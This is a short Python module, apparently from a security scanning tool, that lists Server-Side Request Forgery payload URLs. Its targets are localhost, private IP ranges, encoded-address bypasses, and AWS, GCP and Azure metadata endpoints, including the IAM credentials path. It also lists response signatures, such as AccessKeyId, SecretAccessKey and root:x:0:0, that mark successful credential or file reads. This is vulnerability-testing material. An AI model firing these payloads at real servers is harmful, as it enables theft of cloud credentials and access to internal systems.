"""
SSRF (Server-Side Request Forgery) Payloads — Armora v2.

Internal IP targets and cloud metadata endpoints.
"""

SSRF_PAYLOADS = [
    # Localhost variants
    "http://127.0.0.1",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:8080",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    # Internal network ranges
    "http://10.0.0.1",
    "http://172.16.0.1",
    "http://192.168.0.1",
    "http://192.168.1.1",
    # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data/",
    # GCP metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    # Azure metadata
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # URL-scheme bypass attempts
    "http://127.1",
    "http://0x7f000001",
    "http://2130706433",  # Decimal for 127.0.0.1
]

# Signatures that indicate successful SSRF
SSRF_SUCCESS_SIGNATURES = [
    # AWS metadata indicators
    "ami-id",
    "instance-id",
    "security-credentials",
    "iam/security-credentials",
    "AccessKeyId",
    "SecretAccessKey",
    # GCP metadata indicators
    "computeMetadata",
    "project/project-id",
    # Azure metadata indicators
    "azEnvironment",
    "vmId",
    # Generic internal content
    "root:x:0:0",
    "localhost",
    "internal server",
]
